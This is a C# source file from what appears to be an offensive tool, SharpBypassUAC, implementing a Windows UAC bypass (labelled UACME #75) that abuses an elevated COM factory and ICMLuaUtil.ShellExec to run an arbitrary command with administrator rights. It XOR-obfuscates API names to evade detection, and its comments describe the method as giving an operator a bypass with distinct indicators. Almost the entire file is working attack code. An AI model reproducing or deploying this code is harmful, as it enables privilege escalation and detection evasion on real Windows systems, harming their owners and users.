using System;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    /// <summary>
    /// UACME #75: IDiagnosticProfile COM elevation via DiagCpl factory server.
    ///
    /// Same two-step IElevatedFactoryServer pattern as #74, but uses a different
    /// factory CLSID: {12C21EA7-2EB8-4B55-9249-AC243DA8C666} (DiagCpl factory)
    /// instead of {A6BFEA43-501F-456F-A845-983D3AD7B8F0} (VirtualFactoryServer).
    ///
    /// Because a different CLSID is passed to CoGetObject, Windows spawns DLLHost.exe
    /// with a different /Processid argument — this produces a different detection
    /// signature from #74, giving the operator two bypasses with distinct IOCs.
    ///
    /// Flow:
    ///   1. CoGetObject("Elevation:Administrator!new:{12C21EA7-...}")
    ///      → IElevatedFactoryServer
    ///   2. ServerCreateElevatedObject(CLSID_CMSTPLUA, IID_ICMLuaUtil)
    ///      → ICMLuaUtil (elevated)
    ///   3. ICMLuaUtil.ShellExec(command)
    ///
    /// Unfixed: Windows 7 through Windows 11.
    /// </summary>
    public class DiagCpl
    {
        // XOR key for ole32 API strings
        private static readonly byte _xk = 0x3C;

        // "ole32.dll" ^ 0x3C
        private static readonly byte[] _s0 = new byte[] { 0x53, 0x50, 0x59, 0x0F, 0x0E, 0x12, 0x58, 0x50, 0x50 };
        // "CoGetObject" ^ 0x3C
        private static readonly byte[] _s1 = new byte[] { 0x7F, 0x53, 0x7B, 0x59, 0x48, 0x73, 0x5E, 0x56, 0x59, 0x5F, 0x48 };

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate int CoGetObjectDelegate(
            string pszName,
            ref BIND_OPTS3 pBindOptions,
            ref Guid riid,
            out IntPtr ppv);

        public DiagCpl(byte[] encodedCommand)
        {
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            string command = Encoding.UTF8.GetString(encodedCommand);

            Console.WriteLine("[*] DiagCpl factory COM bypass (UACME #75)");

            var coGetObject = W.G<CoGetObjectDelegate>(W.X(_s0, _xk), W.X(_s1, _xk));

            // DiagCpl factory CLSID: {12C21EA7-2EB8-4B55-9249-AC243DA8C666}
            string moniker = "Elevation:Administrator!new:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}";

            Guid iidFactory = new Guid("804BD226-AF47-4D71-B492-443A57610B08");

            BIND_OPTS3 bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(typeof(BIND_OPTS3));
            bo.dwClassContext = 4; // CLSCTX_LOCAL_SERVER

            IntPtr ppvFactory;
            int hr = coGetObject(moniker, ref bo, ref iidFactory, out ppvFactory);

            if (hr != 0)
            {
                Console.WriteLine("[!] CoGetObject for DiagCpl factory failed: 0x" + hr.ToString("X8"));
                return;
            }

            Console.WriteLine("[+] Obtained elevated IElevatedFactoryServer via DiagCpl");

            IElevatedFactoryServer factory = (IElevatedFactoryServer)Marshal.GetObjectForIUnknown(ppvFactory);

            try
            {
                // Create elevated ICMLuaUtil through factory
                Guid clsidCmstp = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
                Guid iidCmLua = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

                object cmlObj;
                factory.ServerCreateElevatedObject(ref clsidCmstp, ref iidCmLua, out cmlObj);

                if (cmlObj == null)
                {
                    Console.WriteLine("[!] ServerCreateElevatedObject returned null");
                    return;
                }

                Console.WriteLine("[+] Created elevated ICMLuaUtil via DiagCpl factory");

                ICMLuaUtil cmlua = (ICMLuaUtil)cmlObj;

                string file;
                string parameters = null;
                ParseCommand(command, out file, out parameters);

                try
                {
                    cmlua.ShellExec(file, parameters, "C:\\Windows\\System32", 0, 0);
                    Console.WriteLine("[+] Elevated command executed via DiagCpl factory chain");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] ShellExec failed: " + ex.Message);
                }
                finally
                {
                    Marshal.ReleaseComObject(cmlua);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] ServerCreateElevatedObject failed: " + ex.Message);
            }
            finally
            {
                Marshal.ReleaseComObject(factory);
                Marshal.Release(ppvFactory);
            }
        }

        private static void ParseCommand(string command, out string file, out string parameters)
        {
            parameters = null;
            if (command.StartsWith("\""))
            {
                int endQuote = command.IndexOf('"', 1);
                if (endQuote > 0)
                {
                    file = command.Substring(1, endQuote - 1);
                    if (endQuote + 2 < command.Length)
                        parameters = command.Substring(endQuote + 2);
                }
                else
                {
                    file = command.TrimStart('"');
                }
            }
            else
            {
                int spaceIdx = command.IndexOf(' ');
                if (spaceIdx > 0)
                {
                    file = command.Substring(0, spaceIdx);
                    parameters = command.Substring(spaceIdx + 1);
                }
                else
                {
                    file = command;
                }
            }
        }
    }
}
